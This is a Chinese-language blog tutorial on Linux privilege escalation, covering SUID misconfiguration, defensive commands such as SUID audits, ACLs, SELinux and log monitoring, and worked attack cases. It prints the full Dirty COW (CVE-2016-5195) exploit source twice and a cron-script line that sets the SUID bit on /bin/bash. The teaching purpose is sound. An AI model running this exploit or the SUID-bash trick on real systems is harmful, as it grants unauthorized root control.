---
layout: post
title: 权限提升的攻击与防御
date: 2020-01-24 09:30
tags: 二进制安全
excerpt: "本文介绍二进制安全漏洞-权限提升的攻击与防御。"
toc: true
---	
# 权限提升 (Privilege Escalation)

## 描述

权限提升是指攻击者利用系统中的漏洞或错误配置，从低权限用户提升到高权限用户，获取更多系统控制权。权限提升分为两类：

- 水平权限提升：攻击者在相同权限级别的用户之间进行操作。
- 垂直权限提升：攻击者从低权限用户提升到高权限用户，如从普通用户提升到管理员（root）。

## 案例

### 示例场景

假设某系统存在一个可执行文件，普通用户可以运行，但文件本身具有管理员权限。以下是该文件的权限配置：

```bash
-rwsr-xr-x 1 root root 14732 Jun  1 12:34 vulnerable_program
```

文件具有suid位，即使普通用户运行该程序，程序也会以文件所有者（root）的权限运行。

攻击者利用权限提升
攻击者可以通过运行该程序来实现权限提升：

```bash
./vulnerable_program
# 获取root权限
```

## 防御手段

### 最小权限原则

仅给予程序所需的最小权限，避免不必要的高权限设置。例如，如果一个程序不需要特权，就不要设置suid位。

```bash
# 移除suid位
chmod u-s vulnerable_program
```

### 定期审计权限配置

定期检查系统中所有文件和目录的权限配置，确保没有多余的特权。

```bash
# 查找所有具有suid位的文件
find / -perm -4000 -type f -exec ls -l {} \;
```

### 使用访问控制列表 (ACL)

使用访问控制列表（ACL）来细粒度地控制文件和目录的访问权限。

```bash
# 设置文件的ACL
setfacl -m u:username:rwx filename
```

### 安全编码实践

编写代码时遵循安全编码实践，避免潜在的漏洞。例如，防止缓冲区溢出、格式化字符串漏洞等。

### 启用安全模块

使用安全模块如SELinux或AppArmor，来限制进程的操作范围，提高系统安全性。

```bash
# 启用SELinux
setenforce 1
```

### 日志监控

实时监控系统日志，及时发现和响应潜在的权限提升尝试。

```bash
# 查看系统日志
tail -f /var/log/auth.log
```

## 案例扩展

### 1. Linux Kernel Exploits
在某些情况下，攻击者可以利用Linux内核中的漏洞进行权限提升。例如，CVE-2016-5195（Dirty COW）是一个常见的权限提升漏洞，通过写时复制（copy-on-write）机制的竞争条件，攻击者可以将只读内存页修改为可写，进而提升权限。

#### 攻击步骤
查找目标系统中存在的漏洞（例如通过内核版本）。
利用漏洞代码进行攻击。
```c
// Dirty COW Exploit (示例代码)
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    int i, c = 0;
    for(i = 0; i < 1000000 && !c; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madvise %d\n\n", c);
    return NULL;
}

void *procselfmemThread(void *arg) {
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 1000000 && !c; i++) {
        lseek(f, (off_t) map, SEEK_SET);
        c += write(f, name, strlen(name));
    }
    printf("procselfmem %d\n\n", c);
    return NULL;
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;

    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    name = argv[2];

    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);

    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, NULL);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}
```

### 2. Misconfigured Services

某些服务如果配置不当，也可能被用于权限提升。例如，一个配置错误的cron作业可能允许普通用户编写脚本并以root权限运行。

#### 配置错误示例

```bash
# /etc/crontab
* * * * * root /path/to/script.sh
```

如果/path/to/script.sh是可写的，攻击者可以修改脚本内容，实现权限提升。

``` bash
echo 'chmod u+s /bin/bash' > /path/to/script.sh
```

## 总结

权限提升漏洞可能导致严重的安全问题，攻击者可以从低权限用户提升到高权限用户，获得系统的完全控制权。通过最小权限原则、定期审计权限配置、使用ACL、安全编码实践、启用安全模块和日志监控等措施，可以有效防范权限提升漏洞，提高系统安全性。

```bash
# 查找所有具有suid位的文件
find / -perm -4000 -type f -exec ls -l {} \;

# 启用SELinux
setenforce 1

# 查看系统日志
tail -f /var/log/auth.log
```

```c
// Dirty COW Exploit (示例代码)
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    int i, c = 0;
    for(i = 0; i < 1000000 && !c; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madvise %d\n\n", c);
    return NULL;
}

void *procselfmemThread(void *arg) {
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 1000000 && !c; i++) {
        lseek(f, (off_t) map, SEEK_SET);
        c += write(f, name, strlen(name));
    }
    printf("procselfmem %d\n\n", c);
    return NULL;
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;

    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    name = argv[2];

    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);

    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, NULL);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}
```
